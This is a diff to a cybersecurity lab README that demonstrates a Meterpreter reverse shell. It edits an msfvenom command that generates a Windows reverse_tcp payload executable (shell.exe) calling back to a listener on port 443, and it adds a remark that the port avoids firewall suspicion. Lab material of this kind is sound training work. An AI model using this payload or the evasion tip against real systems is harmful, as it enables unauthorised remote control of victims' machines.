@@ -27,7 +27,7 @@ Hands-on cybersecurity lab demonstrating a **Meterpreter reverse shell attack** 
 
 
 ### Kali - Créer reverse shell EXE
- `msfvenom -p windows/meterpreter/reverse_tcp \   LHOST=192.168.30.35 LPORT=443  \ -f exe > shell.exe` 
+ `msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.30.35 LPORT=443  -f exe > shell.exe` 
 
 **Port 443**  = HTTPS →  **non suspect**  (firewall OK)
 
